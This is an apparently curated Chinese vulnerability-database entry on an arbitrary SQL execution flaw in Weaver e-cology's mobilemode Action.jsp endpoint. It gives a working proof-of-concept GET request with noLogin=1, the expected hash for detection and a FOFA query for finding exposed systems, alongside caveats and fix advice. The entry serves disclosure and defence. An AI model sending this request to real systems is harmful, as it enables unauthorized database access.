---
source: "https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/ecologye-mobilemodeAction-sql%E6%B3%A8%E5%85%A5.yaml"
title: "泛微e-cology mobilemode Action.jsp MECAdminAction任意SQL执行"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "来源正文8，完整范围未知；SQL Server"
prerequisites: "noLogin=1不等于所有部署未授权，已在正文限定"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEE-Cology%20mobilemode%20Action.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"泛微-协同办公OA\""
id: "vw-3e81eac50bc1e808bd00869b"
entity_id: "ve-3e81eac50bc1e808bd00869b"
schema_version: "1"
---

# 泛微e-cology mobilemode Action.jsp MECAdminAction任意SQL执行

## 条目说明

- 对象与具体问题：泛微e-cology；mobilemode Action.jsp MECAdminAction任意SQL执行
- 版本、配置及部署条件：来源正文8，完整范围未知；SQL Server
- 认证与权限前提：noLogin=1不等于所有部署未授权，已在正文限定
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 指出上游E-Office混写、固定commit、完整摘要和误报条件
- 可将类型细化为缺少授权的SQL执行接口而不泛称注入
- 应补实际权限和厂商版本证据，保留当前未知而非猜测

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

公开模板记录 E-Cology 移动建模入口通过 `MECAdminAction` 的 `getDatasBySQL` 动作执行传入 SQL。缺少适当权限约束时，数据库查询能力可能暴露给调用者。

### 影响范围与前提

来源正文标注 E-Cology 8，其他元数据存在 E-Office 混写，因此完整受影响范围未知。以下请求采用 SQL Server 函数；`noLogin=1` 是公开请求参数，不是所有部署均无需认证的证明。

### 公开验证资料

下列请求忠实保留上游类名与 SQL 参数，并对 URL 中空格编码：

```http
GET /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.mec.servlet.MECAdminAction&action=getDatasBySQL&datasource=&sql=select%20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456'))&noLogin=1 HTTP/1.1
Host: oa.example.com
```

上游以 `0xe10adc3949` 摘要前缀匹配。人工确认应核对完整计算值 `0xe10adc3949ba59abbe56e057f20f883e` 及其结果上下文，并与正常请求对照；不能凭 HTTP 200 或报错页判断。

### 修复建议

向厂商核对当前版本和对应安全更新；在修复前限制该接口的访问，并检查相关访问日志。

### 参考来源

- [公开资料 1](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/ecologye-mobilemodeAction-sql%E6%B3%A8%E5%85%A5.yaml)

来源已于 2026-10-02 静态核对；本文未在目标环境执行请求，公开 PoC 不代表本地复现通过。
